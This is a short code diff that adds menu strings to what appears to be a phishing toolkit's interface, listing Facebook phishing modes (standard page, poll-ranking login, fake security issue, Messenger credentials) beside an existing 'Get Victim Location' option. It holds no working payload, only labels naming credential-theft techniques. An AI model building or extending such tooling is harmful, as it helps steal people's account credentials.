@@ -36,6 +36,9 @@ lang_start_main_menu = {
     "additional_modules_list" : 
     [ [_('{0}[{1}0A{0}]{1} Get Victim Location')]],
     "operation_mode" : _("\nOperation mode:\n"),
+    "facebook_operation_modes" :
+    [ [_('{0}[{1}1{0}]{1} Standard Page Phishing'),                                      _('{0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode)')],
+      [_('{0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)'), _('{0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode)')]],
 }
 
              
